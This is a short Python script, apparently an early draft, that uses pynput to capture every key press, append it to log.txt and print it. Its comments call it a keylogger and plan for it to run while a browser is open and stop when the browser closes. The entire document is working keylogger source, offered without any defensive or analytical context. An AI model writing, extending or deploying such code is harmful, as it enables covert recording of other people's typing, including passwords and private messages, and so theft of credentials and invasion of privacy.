from pynput import keyboard

def on_press(key):
    with open("log.txt", "a") as log:
        try:
            log.write(key.char + "\n")
            print(key.char)
        except AttributeError:
            # I think I might want to deal with space here
            if key == keyboard.Key.space:
                log.write(" \n")
                print(" ")
        log.close()

def on_release(key):
    if key == keyboard.Key.esc:
        # Stop listener
        return False
    ## Will remove this eventually
    ## Keylogger should operate while browser is up
    ## Keylogger should close whem browser is closed

# Collect events until released
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
